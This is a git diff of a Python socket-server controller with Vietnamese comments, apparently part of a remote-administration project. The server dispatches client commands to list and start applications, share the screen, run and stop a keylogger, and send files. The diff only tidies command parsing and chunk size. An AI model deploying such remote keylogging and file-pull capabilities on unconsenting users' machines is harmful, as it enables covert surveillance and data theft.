@@ -51,17 +51,13 @@ class SV_Controller:
         """Xử lý lệnh từ Client"""
         try:
             while True:
-                command = self.model.receive_response(client_socket).strip()
+                command = self.model.receive_response(client_socket)
 
                 #1. List app running
-                if command == "LIST_APPS_RUNNING":
-                    result = self.model.list_apps_running(client_socket)
-                    self.model.send_command(client_socket, result)
-                    
-                # elif command.startswith("START_APP_BY_PATH"):
-                #     app_path = command.split(" ", 1)[1]
-                #     result = self.model.start_app_by_path(app_path)
-                #     self.model.send_command(client_socket, result)
+                if command == "CM_LIST_APPS_RUNNING":
+                # Gọi phương thức model để lấy danh sách ứng dụng đang chạy
+                    result = self.model.list_apps_running()  # Chuyển lệnh trả về từ model
+                    self.model.send_command(client_socket, result)  # Gửi kết quả lại cho client
                 
                 elif command.startswith("START_APP_BY_NAME"):
                     name = command.split(" ", 1)[1]
@@ -114,7 +110,7 @@ class SV_Controller:
 
                     # Chờ dừng chia sẻ màn hình
                     while True:
-                        stop_command = self.model.receive_response(client_socket).strip()
+                        stop_command = self.model.receive_response(client_socket)
                         if stop_command == "STOP_SCREEN_SHARING":
                             result = self.model.stop_screen_sharing(client_view_stream)
                             self.model.send_command(client_socket, result)
@@ -126,7 +122,7 @@ class SV_Controller:
                     self.model.send_command(client_socket, "Keylogger started.")
                     # Listen for stop command
                     while True:
-                        stop_command = self.model.receive_response(client_socket).strip()
+                        stop_command = self.model.receive_response(client_socket)
                         if stop_command == "STOP_KEYLOGGER":
                             result = self.model.stop_keylogger(listener)
                             self.model.send_command(client_socket, result)
@@ -152,7 +148,7 @@ class SV_Controller:
                             file_size.to_bytes(4, byteorder='big'))
                         # Gửi nội dung file tới client
                         with open(file_path, 'rb') as f:
-                            while (chunk := f.read(4096)):
+                            while (chunk := f.read(65535)):
                                 client_socket.sendall(chunk)
                     else:
                         # Gửi lỗi nếu file không tồn tại
